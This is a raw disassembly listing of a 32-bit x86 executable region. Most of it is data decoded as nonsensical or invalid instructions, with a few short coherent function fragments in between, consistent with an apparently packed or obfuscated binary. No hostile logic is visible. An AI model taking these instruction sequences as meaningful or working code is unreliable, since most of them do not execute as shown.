  40b666:	call   0x49592bb3
  40b66b:	in     eax,dx
  40b66c:	test   edx,eax
  40b66e:	sbb    DWORD PTR [ebx],ebp
  40b670:	sbb    al,ch
  40b672:	les    edi,FWORD PTR [ebx+0x62]
  40b675:	das    
  40b676:	mov    dl,0xef
  40b678:	mov    ebp,DWORD PTR [ebx]
  40b67a:	jg     0x40b622
  40b67c:	cli    
  40b67d:	pop    ss
  40b67e:	stos   DWORD PTR es:[edi],eax
  40b67f:	in     eax,dx
  40b680:	sub    esp,DWORD PTR [ecx+esi*4+0xc408b96]
  40b687:	mov    ecx,DWORD PTR [ecx]
  40b689:	jmp    0x40b841
  40b68e:	frndint 
  40b690:	std    
  40b691:	imul   ebx,DWORD PTR [ebp+0x69],0xffffffe9
  40b695:	mov    ch,BYTE PTR [edi+edx*8-0x20]
  40b699:	xor    ecx,DWORD PTR [edi-0x38]
  40b69c:	mov    bh,0xd3
  40b69e:	sub    dh,bl
  40b6a0:	jo     0x40b712
  40b6a2:	xchg   ebp,eax
  40b6a3:	jg     0x40b715
  40b6a5:	jo     0x40b6a2
  40b6a7:	mov    DWORD PTR [edx-0x77],0xd531f60f
  40b6ae:	shr    BYTE PTR [edx-0x5b],1
  40b6b1:	mov    ecx,0xc1d20227
  40b6b6:	xor    BYTE PTR [ebx+0x78],bl
  40b6b9:	dec    ecx
  40b6ba:	ja     0x40b6d1
  40b6bc:	add    DWORD PTR [ecx+eiz*2+0x53d540aa],ebx
  40b6c3:	sbb    ebx,edx
  40b6c5:	pop    edi
  40b6c6:	out    dx,eax
  40b6c7:	sbb    dh,al
  40b6c9:	push   edi
  40b6ca:	mov    esi,DWORD PTR [ebp-0x50715a99]
  40b6d0:	cmp    DWORD PTR [ebx+0x64],edi
  40b6d3:	cmp    dh,BYTE PTR [ebx+0x7]
  40b6d6:	leave  
  40b6d7:	dec    ebx
  40b6d8:	push   cs
  40b6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6da:	cdq    
  40b6db:	stc    
  40b6dc:	sbb    ebp,eax
  40b6de:	sbb    eax,0x9a3951ef
  40b6e3:	jb     0x40b6c6
  40b6e5:	push   ds
  40b6e6:	fisub  DWORD PTR [eax]
  40b6e8:	int    0xea
  40b6ea:	in     al,dx
  40b6eb:	inc    esp
  40b6ec:	jo     0x40b73a
  40b6ee:	jecxz  0x40b75c
  40b6f0:	cmp    cl,al
  40b6f2:	inc    ebx
  40b6f3:	jg     0x40b6e6
  40b6f5:	xchg   edi,eax
  40b6f6:	mov    ?,WORD PTR [esi+0x779adac0]
  40b6fc:	(bad)  
  40b6fd:	jb     0x40b721
  40b6ff:	mov    ch,0xf3
  40b701:	lods   al,BYTE PTR ds:[esi]
  40b702:	ins    BYTE PTR es:[edi],dx
  40b703:	sub    dh,dl
  40b705:	jp     0x40b6ce
  40b707:	cmp    bh,BYTE PTR [edi]
  40b709:	and    edi,DWORD PTR [ebp-0x3ff18463]
  40b70f:	retf   0x9284
  40b712:	cmp    esp,DWORD PTR [esi]
  40b714:	ficom  DWORD PTR [eax-0x1b]
  40b717:	xor    cl,ch
  40b719:	mov    ch,0x6c
  40b71b:	fdiv   QWORD PTR [edx+eax*4-0x48]
  40b71f:	sbb    DWORD PTR [edi+0x5a479c1],esp
  40b725:	mov    ds:0xd5901106,al
  40b72a:	loope  0x40b72b
  40b72c:	add    bl,BYTE PTR [eax+0x541924bd]
  40b732:	push   ebx
  40b733:	xor    DWORD PTR [edi+0x7c],edx
  40b736:	cmp    eax,0xc2db297d
  40b73b:	enter  0xde49,0x97
  40b73f:	cmp    BYTE PTR [ecx+eiz*2],dl
  40b742:	test   BYTE PTR [esi-0x5a286195],cl
  40b748:	mov    cl,0x32
  40b74a:	lds    esp,FWORD PTR [edx+0x45eb80e0]
  40b750:	or     ebx,DWORD PTR [ebx-0x2]
  40b753:	loope  0x40b6d8
  40b755:	xor    ecx,ebp
  40b757:	sti    
  40b758:	xor    BYTE PTR [edx+ebx*1+0x63b2fa57],ch
  40b75f:	icebp  
  40b760:	(bad)  
  40b761:	mov    bl,0xf6
  40b763:	popa   
  40b764:	(bad)  
  40b765:	jbe    0x40b703
  40b767:	ret    0x10c
  40b76a:	std    
  40b76b:	fld    st(5)
  40b76d:	xor    BYTE PTR [ecx],dl
  40b76f:	mov    dl,0xcb
  40b771:	fadd   DWORD PTR [edx]
  40b773:	fiadd  DWORD PTR [ebx+0x6b]
  40b776:	mov    ecx,0x86793f6
  40b77b:	sar    BYTE PTR [esp+eax*4+0x2599f9f2],0xb1
  40b783:	cdq    
  40b784:	cmc    
  40b785:	sbb    DWORD PTR [ebp-0x21202c71],esp
  40b78b:	test   al,0x25
  40b78d:	jns    0x40b7d2
  40b78f:	xchg   ebp,eax
  40b790:	(bad)  
  40b791:	(bad)  
  40b792:	sub    al,0xa6
  40b794:	mov    eax,ds:0x5738ab20
  40b799:	push   eax
  40b79a:	mov    ah,0x1e
  40b79c:	push   cs
  40b79d:	inc    esp
  40b79e:	push   esi
  40b79f:	mov    cl,0x4c
  40b7a1:	or     DWORD PTR [edx],esp
  40b7a3:	jl     0x40b784
  40b7a5:	mov    gs,WORD PTR [ebx-0x114cd969]
  40b7ab:	mov    ds:0xd59d6765,al
  40b7b0:	call   0x53aa:0x1edf32ef
  40b7b7:	mov    ecx,0x91aaa794
  40b7bc:	cmovno edx,DWORD PTR [eax]
  40b7bf:	cmp    DWORD PTR [esi-0x72],0x97bf4756
  40b7c6:	and    eax,0xc4332b17
  40b7cb:	mov    cl,0xc5
  40b7cd:	data16 (bad) 
  40b7cf:	in     eax,0xfe
  40b7d1:	mov    ecx,0x8fe94db5
  40b7d6:	sbb    dh,cl
  40b7d8:	adc    al,0xde
  40b7da:	lea    eax,[ecx]
  40b7dc:	adc    eax,0x33ac20b4
  40b7e1:	xor    eax,0x6ec87398
  40b7e6:	dec    esp
  40b7e7:	lea    ebx,[eax]
  40b7e9:	mov    ah,0x6d
  40b7eb:	mov    eax,ds:0xd7c6c6db
  40b7f0:	(bad)
  40b7f4:	retf   
  40b7f5:	mov    al,0x8b
  40b7f7:	pop    es
  40b7f8:	ret    
  40b7f9:	cdq    
  40b7fa:	cdq    
  40b7fb:	push   edx
  40b7fc:	adc    eax,DWORD PTR [edi+0x495355c5]
  40b802:	xor    cl,BYTE PTR [ebx]
  40b804:	xchg   ebp,eax
  40b805:	push   ss
  40b806:	or     BYTE PTR [edi-0x6],0x91
  40b80a:	div    BYTE PTR [ecx+0x281a070c]
  40b810:	push   eax
  40b811:	fld    TBYTE PTR [ebp-0x25cc3a24]
  40b817:	xchg   edi,eax
  40b818:	scas   eax,DWORD PTR es:[edi]
  40b819:	and    ecx,DWORD PTR [ebp+0x33807e55]
  40b81f:	jns    0x40b7b5
  40b821:	jmp    0xa07d:0xf9d25786
  40b828:	jp     0x40b838
  40b82a:	inc    esp
  40b82b:	bound  esp,QWORD PTR [edx+0x3327439a]
  40b831:	dec    esp
  40b832:	shr    BYTE PTR [esi+0x176cd779],0x93
  40b839:	cmp    al,bh
  40b83b:	mov    dh,0xe
  40b83d:	fs shl eax,cl
  40b840:	sti    
  40b841:	mov    al,BYTE PTR [eax+ecx*1]
  40b844:	add    al,0x37
  40b846:	jmp    0x40b9fe
  40b84b:	hlt    
  40b84c:	sbb    eax,0x71518348
  40b851:	rep ins DWORD PTR es:[edi],dx
  40b853:	cmp    BYTE PTR [esp+ecx*2],al
  40b856:	aaa    
  40b857:	mov    bh,0x77
  40b859:	hlt    
  40b85a:	enter  0xf24f,0x70
  40b85e:	jo     0x40b7f5
  40b860:	jg     0x40b8d2
  40b862:	jo     0x40b8bf
  40b864:	stos   BYTE PTR es:[edi],al
  40b865:	dec    ebp
  40b866:	daa    
  40b867:	ins    BYTE PTR es:[edi],dx
  40b868:	jp     0x40b817
  40b86a:	or     eax,0x9efe3f11
  40b86f:	fdivr  QWORD PTR [eax+0x3e]
  40b872:	(bad)  
  40b873:	mov    bh,0xae
  40b875:	sti    
  40b876:	add    DWORD PTR [edi],0x5bd07b14
  40b87c:	mov    ecx,0x521a4749
  40b881:	popf   
  40b882:	mov    eax,ds:0x513f91ef
  40b887:	sub    DWORD PTR [ecx],0x5f
  40b88a:	clc    
  40b88b:	lods   al,BYTE PTR ds:[esi]
  40b88c:	xchg   ecx,eax
  40b88d:	popa   
  40b88e:	not    DWORD PTR [edi+ebp*4+0x52]
  40b892:	shl    DWORD PTR [eax-0x135cc7a6],cl
  40b898:	push   es
  40b899:	sti    
  40b89a:	add    eax,0xdf648286
  40b89f:	or     edx,edx
  40b8a1:	inc    eax
  40b8a2:	out    0x1,al
  40b8a4:	les    ebx,FWORD PTR [ecx+0x53e57a50]
  40b8aa:	imul   esp,DWORD PTR [esi-0x16f341b0],0xffffff93
  40b8b1:	sub    al,0x97
  40b8b3:	sbb    esp,esi
  40b8b5:	sbb    DWORD PTR [eax],0xfcb6a012
  40b8bb:	jmp    0x40b932
  40b8bd:	cmp    ah,dl
  40b8bf:	adc    eax,ecx
  40b8c1:	pop    ecx
  40b8c2:	adc    DWORD PTR [ebx],ecx
  40b8c4:	lods   eax,DWORD PTR ds:[esi]
  40b8c5:	out    dx,eax
  40b8c6:	cmp    al,0xaf
  40b8c8:	rcl    DWORD PTR [edx-0x25],0x7c
  40b8cc:	inc    eax
  40b8cd:	xlat   BYTE PTR ds:[ebx]
  40b8ce:	loope  0x40b8aa
  40b8d0:	cmp    BYTE PTR [esp+ebx*4+0x36392e9],0xe7
  40b8d8:	daa    
  40b8d9:	lods   al,BYTE PTR ds:[esi]
  40b8da:	cmp    DWORD PTR [ebx-0x1],ecx
  40b8dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8de:	cmc    
  40b8df:	cmc    
  40b8e0:	dec    ebp
  40b8e1:	push   edi
  40b8e2:	clc    
  40b8e3:	dec    ecx
  40b8e4:	mov    bl,0xd1
  40b8e6:	pushw  ss
  40b8e8:	fwait
  40b8e9:	enter  0x4df0,0x16
  40b8ed:	arpl   WORD PTR [ebp-0x3c],cx
  40b8f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8f1:	pop    esi
  40b8f2:	or     BYTE PTR [eax-0x11],ch
  40b8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8f6:	jp     0x40b8b5
  40b8f8:	inc    eax
  40b8f9:	adc    dl,BYTE PTR ds:0x29e98560
  40b8ff:	pop    edx
  40b900:	shl    ah,1
  40b902:	popf   
  40b903:	mov    ds:0xc0bbb612,al
  40b908:	lods   al,BYTE PTR ds:[esi]
  40b909:	(bad)  
  40b90a:	pop    ebp
  40b90b:	xchg   ebx,eax
  40b90c:	pop    ebp
  40b90d:	and    ebp,ecx
  40b90f:	bound  ecx,QWORD PTR [esi-0x1ff8031e]
  40b915:	mov    esi,0xcd3a8dda
  40b91a:	jmp    0x40b956
  40b91c:	jmp    0x40b90a
  40b91e:	fs jg  0x40b8c0
  40b921:	or     esi,DWORD PTR [edi]
  40b923:	mov    ebx,0x8253d84
  40b928:	scas   al,BYTE PTR es:[edi]
  40b929:	loope  0x40b8db
  40b92b:	push   0x0
  40b92d:	mov    ?,WORD PTR [edx-0x48]
  40b930:	aaa    
  40b931:	mov    edx,0xf6776fcc
  40b936:	loop   0x40b95c
  40b938:	inc    edi
  40b939:	mov    ecx,0x1a866711
  40b93e:	adc    dh,BYTE PTR [edi+eiz*4+0x6c]
  40b942:	jnp    0x40b92c
  40b944:	cmp    DWORD PTR [eax],ebp
  40b946:	jne    0x40b919
  40b948:	sub    eax,esi
  40b94a:	sub    DWORD PTR [ebx-0x7a],0xffffffb2
  40b94e:	ja     0x40b8d6
  40b950:	inc    esi
  40b951:	std    
  40b952:	cld    
  40b953:	dec    esp
  40b954:	sbb    esp,DWORD PTR [edx+0xe3fadd9]
  40b95a:	sbb    al,0x34
  40b95c:	mul    edx
  40b95e:	and    eax,0x26691a66
  40b963:	mov    ds:0xda7cf5ff,eax
  40b968:	(bad)  
  40b969:	cmp    eax,DWORD PTR [edi+edx*1-0x39fc1196]
  40b970:	cwde   
  40b971:	lds    edi,FWORD PTR [edx]
  40b973:	push   cs
  40b974:	ret    
  40b975:	adc    ah,BYTE PTR [esp+ebx*4+0xe]
  40b979:	dec    ecx
  40b97a:	std    
  40b97b:	jg     0x40b908
  40b97d:	arpl   WORD PTR [ecx],ax
  40b97f:	adc    al,0x67
  40b981:	jmp    0x40b9ff
  40b983:	adc    al,0xe5
  40b985:	jae    0x40b97c
  40b987:	(bad)  
  40b988:	add    BYTE PTR ds:0x99ca56a9,bh
  40b98e:	lahf   
  40b98f:	call   DWORD PTR [edx]
  40b991:	lahf   
  40b992:	adc    DWORD PTR [ebx],edx
  40b994:	cmp    bl,dl
  40b996:	add    DWORD PTR [ebp+0x4f],0xe75f88f0
  40b99d:	les    ecx,FWORD PTR ds:0x598d7be3
  40b9a3:	ficom  DWORD PTR ds:0x39886d5b
  40b9a9:	sub    ah,BYTE PTR [ecx]
  40b9ab:	cld    
  40b9ac:	jge    0x40ba1e
  40b9ae:	sbb    eax,0x867bb57b
  40b9b3:	mov    ah,0xae
  40b9b5:	fisttp WORD PTR [ebx+edi*2-0x48]
  40b9b9:	mov    dh,BYTE PTR ds:0x720eddfd
  40b9bf:	gs xchg ecx,eax
  40b9c1:	pop    esp
  40b9c2:	push   esi
  40b9c3:	loope  0x40b98e
  40b9c5:	in     al,0x88
  40b9c7:	adc    BYTE PTR [esi-0x65],bl
  40b9ca:	mov    eax,eax
  40b9cc:	jp     0x40ba1d
  40b9ce:	lea    ebp,[ebx]
  40b9d0:	pop    esp
  40b9d1:	jmp    0x40b9a6
  40b9d3:	cmp    eax,0xea91cda9
  40b9d8:	push   0xc744df25
  40b9dd:	xchg   DWORD PTR [edx],esp
  40b9df:	mov    BYTE PTR [ecx+0x3e83bfdc],bl
  40b9e5:	pop    es
  40b9e6:	mov    al,ds:0x9290877a
  40b9eb:	xchg   edx,eax
  40b9ec:	and    eax,DWORD PTR ds:0x3c27b8c6
  40b9f2:	inc    esi
  40b9f3:	ret    
  40b9f4:	jge    0x40ba1f
  40b9f6:	mov    DWORD PTR [ebp-0x75],ebp
  40b9f9:	retf   0xc8b5
  40b9fc:	aam    0x97
  40b9fe:	xor    al,0x47
  40ba00:	cmp    al,0xc5
  40ba02:	je     0x40ba19
  40ba08:	mov    eax,DWORD PTR [ebp+0x8]
  40ba0b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba0e:	xor    eax,esi
  40ba10:	add    eax,edi
  40ba12:	mov    DWORD PTR [ecx],eax
  40ba14:	jmp    0x40bbf5
  40ba19:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40ba20:	jmp    0x40bbf5
  40ba25:	mov    eax,DWORD PTR [ebp-0x8]
  40ba28:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ba2b:	mov    ecx,DWORD PTR [ecx]
  40ba2d:	mov    DWORD PTR [eax],ecx
  40ba2f:	mov    eax,DWORD PTR [ebp+0xc]
  40ba32:	jmp    0x40bbea
  40ba37:	retf   
  40ba38:	(bad)  [ebx+0x5171a9c1]
  40ba3e:	icebp  
  40ba3f:	dec    eax
  40ba40:	cmp    eax,0xe6590d6b
  40ba45:	sub    DWORD PTR [edi],0x7070f0e4
  40ba4b:	xchg   ebp,eax
  40ba4c:	jg     0x40babe
  40ba4e:	jo     0x40ba83
  40ba50:	ins    BYTE PTR es:[edi],dx
  40ba51:	mov    ah,0x8c
  40ba53:	(bad)  [esi-0x2b65b1f0]
  40ba59:	push   0xc3165ac0
  40ba5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba5f:	(bad)  
  40ba61:	in     al,dx
  40ba62:	jbe    0x40ba4d
  40ba64:	ror    DWORD PTR [ebp+0x7f],0x31
  40ba68:	inc    esp
  40ba69:	test   eax,0xbeaf8552
  40ba6e:	sbb    al,cl
  40ba70:	adc    eax,0x4611cf6d
  40ba75:	jl     0x40ba04
  40ba77:	in     eax,dx
  40ba78:	xor    DWORD PTR [ebx],edx
  40ba7a:	or     DWORD PTR [ebx-0x55],esp
  40ba7d:	int    0x20
  40ba7f:	sti    
  40ba80:	fst    DWORD PTR [ecx+0x3a]
  40ba83:	pop    ebx
  40ba84:	daa    
  40ba85:	xchg   ebp,eax
  40ba86:	out    dx,al
  40ba87:	outs   dx,DWORD PTR ds:[esi]
  40ba88:	in     eax,dx
  40ba89:	cs pop eax
  40ba8b:	mov    dl,0xe6
  40ba8d:	enter  0x4992,0x7f
  40ba91:	pop    ecx
  40ba92:	bound  ecx,QWORD PTR [esp+eax*1-0x2188275d]
  40ba99:	xor    DWORD PTR [esp+edx*4+0x569f290f],eax
  40baa0:	les    esi,FWORD PTR [esi-0x19]
  40baa3:	jno    0x40bb07
  40baa5:	pop    esi
  40baa6:	sbb    BYTE PTR [edi+0x8e82690],bh
  40baac:	(bad)  
  40baad:	pop    ds
  40baae:	punpckhwd mm7,mm2
  40bab1:	lea    ecx,[edx]
  40bab3:	jb     0x40baec
  40bab5:	and    edi,ebx
  40bab7:	sub    edi,DWORD PTR [esi+esi*4-0x696cca0d]
  40babe:	xchg   DWORD PTR [ecx+ecx*2],edi
  40bac1:	pop    ecx
  40bac2:	and    cl,BYTE PTR [eax-0x5e1558a0]
  40bac8:	mov    esi,0x98550a6c
  40bacd:	(bad)  
  40bace:	pop    edx
  40bacf:	(bad)  
  40bad0:	gs gs and al,0xf5
  40bad4:	retf   
  40bad5:	add    eax,0xb7cba4c
  40bada:	fs jle 0x40bad4
  40badd:	fs mov ah,0xc4
  40bae0:	sbb    al,0x37
  40bae2:	and    eax,0x1c05b585
  40bae7:	out    0xb1,al
  40bae9:	mov    al,ds:0x35714544
  40baee:	sbb    eax,esp
  40baf0:	(bad)
  40baf3:	sub    al,BYTE PTR [eax]
  40baf5:	add    al,0x9b
  40baf7:	sbb    eax,0xe7f7c61e
  40bafc:	sub    ah,al
  40bafe:	jg     0x40ba83
  40bb00:	inc    esp
  40bb01:	cmp    ecx,edi
  40bb03:	pushf  
  40bb04:	enter  0xb1a7,0x24
  40bb08:	push   es
  40bb09:	mov    fs,WORD PTR [esp+edi*1]
  40bb0c:	cmp    BYTE PTR [ecx-0x6ee28e60],bh
  40bb12:	push   esi
  40bb13:	inc    ch
  40bb15:	retf   
  40bb16:	sbb    BYTE PTR [edx+0x50263398],bh
  40bb1c:	pop    ebx
  40bb1d:	imul   eax,DWORD PTR [edx-0x189106cf],0x27
  40bb24:	mov    edx,0x7d40a213
  40bb29:	inc    esi
  40bb2a:	add    BYTE PTR [ebx-0x2b997c10],bl
  40bb30:	xchg   edx,eax
  40bb31:	xchg   ebx,eax
  40bb32:	dec    ebx
  40bb33:	inc    edx
  40bb34:	iret   
  40bb35:	pop    edi
  40bb36:	or     ah,BYTE PTR [edx]
  40bb38:	shl    DWORD PTR [edx-0x3d038921],0x37
  40bb3f:	lahf   
  40bb40:	frstor [ebx-0x46]
  40bb43:	ins    BYTE PTR es:[edi],dx
  40bb44:	xor    ebp,ecx
  40bb46:	jecxz  0x40bb77
  40bb48:	pushf  
  40bb49:	inc    ecx
  40bb4a:	inc    eax
  40bb4b:	sub    BYTE PTR [ecx+esi*8-0x5c6d6157],al
  40bb52:	xchg   esi,eax
  40bb53:	jp     0x40bb81
  40bb55:	retf   
  40bb56:	mov    ebp,0x3dc4a748
  40bb5b:	lods   al,BYTE PTR ds:[esi]
  40bb5c:	daa    
  40bb5d:	lock test DWORD PTR [ebx*8-0x701fe216],edx
  40bb65:	pop    ebx
  40bb66:	jns    0x40bbe6
  40bb68:	bound  esp,QWORD PTR [esi-0x7e]
  40bb6b:	aas    
  40bb6c:	fucomp st(1)
  40bb6e:	mov    dl,0xbf
  40bb70:	push   ds
  40bb71:	sub    cl,BYTE PTR [esp+eiz*4-0x5b9a6cb1]
  40bb78:	pop    ds
  40bb79:	arpl   WORD PTR [esi+0x5d],si
  40bb7c:	pop    edi
  40bb7d:	or     DWORD PTR [eax-0x4],ebp
  40bb80:	jge    0x40bbea
  40bb82:	std    
  40bb83:	push   edx
  40bb84:	xor    DWORD PTR [edi],edx
  40bb86:	or     eax,0xce6fdf30
  40bb8b:	repz int 0x72
  40bb8e:	or     DWORD PTR [ecx],ebx
  40bb90:	pop    esp
  40bb91:	cs imul ebx,esp,0x5a
  40bb95:	adc    eax,0x84d859ab
  40bb9a:	mov    bh,0x72
  40bb9c:	jno    0x40bbfe
  40bb9e:	adc    esi,DWORD PTR [ecx-0x34]
  40bba1:	ret    0x3d71
  40bba4:	fs and al,0xfd
  40bba7:	jae    0x40bb39
  40bba9:	jns    0x40bb50
  40bbab:	dec    ebp
  40bbac:	jo     0x40bba8
  40bbae:	push   eax
  40bbaf:	or     eax,0xd6b90b7a
  40bbb4:	fwait
  40bbb5:	and    eax,esi
  40bbb7:	scas   al,BYTE PTR es:[edi]
  40bbb8:	push   edi
  40bbb9:	sbb    eax,0xae5aa2af
  40bbbe:	inc    edx
  40bbbf:	fstp   QWORD PTR [eax]
  40bbc1:	pop    eax
  40bbc2:	fnstcw WORD PTR [edi+0xb80e87]
  40bbc8:	cmp    BYTE PTR [ebx-0x9a4f72b],bl
  40bbce:	mov    edi,0xdeb4173
  40bbd3:	jb     0x40bbff
  40bbd5:	mov    esp,0x3c587bc6
  40bbda:	mov    al,ds:0x7ca08869
  40bbdf:	rcr    BYTE PTR [eax],cl
  40bbe1:	cmp    eax,0xcec8a84
  40bbe6:	je     0x40bbb2
  40bbe8:	inc    ebp
  40bbe9:	in     al,dx
  40bbea:	mov    eax,DWORD PTR [ebp+0x8]
  40bbed:	push   DWORD PTR [ebp-0x8]
  40bbf0:	call   0x401000
  40bbf5:	mov    eax,DWORD PTR [ebp-0xc]
  40bbf8:	cmp    eax,ebx
  40bbfa:	je     0x40acdc
  40bc00:	mov    eax,DWORD PTR [ebp-0x8]
  40bc03:	mov    eax,DWORD PTR [eax]
  40bc05:	pop    edi
  40bc06:	pop    esi
  40bc07:	pop    ebx
  40bc08:	leave  
  40bc09:	ret    0x8
  40bc0c:	push   ebp
  40bc0d:	mov    ebp,esp
  40bc0f:	push   ecx
  40bc10:	sbb    DWORD PTR ds:0x43439a,ecx
  40bc16:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40bc1d:	sbb    eax,DWORD PTR ds:0x434392
  40bc23:	mov    eax,DWORD PTR [ebp+0x8]
  40bc26:	or     DWORD PTR ds:0x434415,0x432dbe
  40bc30:	jmp    0x40be4b
  40bc35:	push   es
  40bc36:	mov    ch,dl
  40bc38:	xor    al,0x72
  40bc3a:	je     0x40bc02
  40bc3c:	stos   BYTE PTR es:[edi],al
  40bc3d:	aas    
  40bc3e:	lods   al,BYTE PTR ds:[esi]
  40bc3f:	and    DWORD PTR [eax-0x365083ce],edi
  40bc45:	jns    0x40bc45
  40bc47:	jo     0x40bcb9
  40bc49:	jb     0x40bcca
  40bc4b:	jo     0x40bcbd
  40bc4d:	mov    dx,cs
  40bc50:	test   esi,edx
  40bc52:	sub    BYTE PTR [eax-0x79fb6778],ch
  40bc58:	ins    DWORD PTR es:[edi],dx
  40bc59:	dec    edi
  40bc5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc5b:	and    BYTE PTR ss:[esi+0x69346425],dh
  40bc62:	repz (bad) 
  40bc64:	pushf  
  40bc65:	inc    esi
  40bc66:	adc    ch,dl
  40bc68:	cwde   
  40bc69:	fwait
  40bc6a:	pop    ds
  40bc6b:	stc    
  40bc6c:	cld    
  40bc6d:	clc    
  40bc6e:	cld    
  40bc6f:	inc    esp
  40bc71:	outs   dx,BYTE PTR ds:[esi]
  40bc72:	aas    
  40bc73:	inc    edi
  40bc74:	aam    0x30
  40bc76:	bound  ecx,QWORD PTR [eax]
  40bc78:	fidivr WORD PTR [esi+0x26ad29ca]
  40bc7e:	test   al,0xa1
  40bc80:	aad    0xe1
  40bc82:	sbb    al,0x5c
  40bc84:	mov    DWORD PTR [eax],esp
  40bc86:	inc    eax
  40bc87:	retf   
  40bc88:	aaa    
  40bc89:	sti    
  40bc8a:	mov    al,ds:0x716e4d81
  40bc8f:	popa   
  40bc90:	mov    esi,0xfa4d266e
  40bc95:	add    eax,0xffffffc8
  40bc98:	test   BYTE PTR [eax-0x64cf0cde],ah
  40bc9e:	sbb    ah,ch
  40bca0:	ins    DWORD PTR es:[edi],dx
  40bca1:	xor    al,0xef
  40bca3:	lods   eax,DWORD PTR ds:[esi]
  40bca4:	mov    ds:0xb14cbb3,eax
  40bca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcaa:	dec    edi
  40bcab:	adc    al,0x4e
  40bcad:	sub    al,0x1c
  40bcaf:	js     0x40bce0
  40bcb1:	(bad)
  40bcb6:	push   es
  40bcb7:	sbb    al,BYTE PTR [eax-0x646c3f13]
  40bcbd:	jb     0x40bc63
  40bcbf:	aad    0x47
  40bcc1:	popf   
  40bcc2:	and    bh,BYTE PTR [edi]
  40bcc4:	xor    al,0x82
  40bcc6:	adc    ebp,DWORD PTR [esp+edx*2+0x3807e60e]
  40bccd:	sbb    al,0xfe
  40bccf:	fwait
  40bcd0:	popa   
  40bcd1:	retf   0x2a49
  40bcd4:	jmp    0x26cbaeed
  40bcd9:	dec    ebp
  40bcda:	es mov dl,0x8f
  40bcdd:	rcl    esi,0xad
  40bce0:	or     ch,BYTE PTR [ebx]
  40bce2:	ss pusha 
  40bce4:	sub    al,BYTE PTR [ebx-0x47c48a05]
  40bcea:	(bad)  
  40bceb:	jmp    DWORD PTR [eax+0x42]
  40bcee:	inc    esi
  40bcef:	in     al,dx
  40bcf0:	push   ecx
  40bcf1:	mov    cl,0xf0
  40bcf3:	jmp    0x40bd03
  40bcf5:	or     eax,0x74dfb1fc
  40bcfa:	dec    edx
  40bcfb:	mov    bl,0x28
  40bcfd:	jno    0x40bce3
  40bcff:	not    BYTE PTR [eax-0x1e]
  40bd02:	xor    eax,0x9996358c
  40bd07:	mov    al,0x50
  40bd09:	aas    
  40bd0a:	pushf  
  40bd0b:	mov    esi,0xcd643138
  40bd10:	cs dec ebx
  40bd12:	pop    edi
  40bd13:	or     eax,0x3918b7c
  40bd18:	dec    esp
  40bd19:	pusha  
  40bd1a:	adc    BYTE PTR [ebx+0x3421b40f],bh
  40bd20:	jp     0x40bd5d
  40bd22:	or     BYTE PTR [edx+0x3d],dl
  40bd25:	scas   eax,DWORD PTR es:[edi]
  40bd26:	add    ecx,esp
  40bd28:	jmp    ecx
  40bd2a:	pop    esi
  40bd2b:	xchg   esp,eax
  40bd2c:	in     eax,0xb4
  40bd2e:	dec    ebx
  40bd2f:	int3   
  40bd30:	mov    ?,WORD PTR [eax+edi*1+0x1d]
  40bd34:	fadd   st(0),st
  40bd36:	xlat   BYTE PTR ds:[ebx]
  40bd37:	and    edi,eax
  40bd39:	inc    ebx
  40bd3a:	aad    0x9f
  40bd3c:	in     al,0x26
  40bd3e:	mov    eax,0x9bf29f95
  40bd43:	jne    0x40bd7c
  40bd45:	mov    al,ds:0x63629da3
  40bd4a:	xchg   edx,eax
  40bd4b:	ffreep st(0)
  40bd4d:	push   edx
  40bd4e:	or     eax,0x3b9eea04
  40bd53:	sub    al,0x14
  40bd55:	ins    DWORD PTR es:[edi],dx
  40bd56:	fmul   QWORD PTR [edx]
  40bd58:	arpl   sp,bp
  40bd5a:	je     0x40bd4b
  40bd5c:	je     0x40bd35
  40bd5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd5f:	jp     0x40bce8
  40bd61:	inc    ebp
  40bd62:	mov    edx,DWORD PTR [edx+0x27ff0fb6]
  40bd68:	ja     0x40bd6a
  40bd6a:	sub    DWORD PTR [ebx],edi
  40bd6c:	cli    
  40bd6d:	xchg   ecx,eax
  40bd6e:	stos   DWORD PTR es:[edi],eax
  40bd6f:	dec    ecx
  40bd70:	mov    bl,0xea
  40bd72:	ins    DWORD PTR es:[edi],dx
  40bd73:	(bad)  
  40bd74:	mov    ecx,ebp
  40bd76:	dec    edi
  40bd77:	mov    eax,DWORD PTR [ebp+0x7]
  40bd7a:	dec    edx
  40bd7b:	xchg   ebp,eax
  40bd7c:	adc    BYTE PTR [ecx-0x3f],0xc1
  40bd80:	and    BYTE PTR [ecx-0x2bcd3d10],bh
  40bd86:	add    DWORD PTR [edx+0x61b420c3],edx
  40bd8c:	rol    DWORD PTR [edi+0x58],1
  40bd8f:	retf   
  40bd90:	aad    0x36
  40bd92:	pop    esi
  40bd93:	and    edi,DWORD PTR [edi]
  40bd95:	add    al,bl
  40bd97:	or     cl,BYTE PTR [edx+0x6cedf230]
  40bd9d:	test   al,0x30
  40bd9f:	pop    ebp
  40bda0:	les    eax,FWORD PTR [esp+ebp*1]
  40bda3:	cmp    esi,DWORD PTR ds:0xb139668c
  40bda9:	jbe    0x40bd9f
  40bdab:	inc    edi
  40bdac:	inc    esi
  40bdad:	or     bl,al
  40bdaf:	add    eax,0xa824162b
  40bdb4:	push   ds
  40bdb5:	add    al,bh
  40bdb7:	adc    DWORD PTR [edx-0x7a],ebp
  40bdba:	js     0x40be37
  40bdbc:	ret    
  40bdbd:	sub    edx,esi
  40bdbf:	fadd   DWORD PTR [ebx]
  40bdc1:	cs push 0x75
  40bdc4:	push   ecx
  40bdc5:	fisubr DWORD PTR [esp+eax*1+0x65ec1151]
  40bdcc:	retf   
  40bdcd:	xor    al,0xe9
  40bdcf:	dec    ebp
  40bdd0:	inc    edx
  40bdd1:	push   ebp
  40bdd2:	add    BYTE PTR [edx+0x53],ch
  40bdd5:	xchg   esp,eax
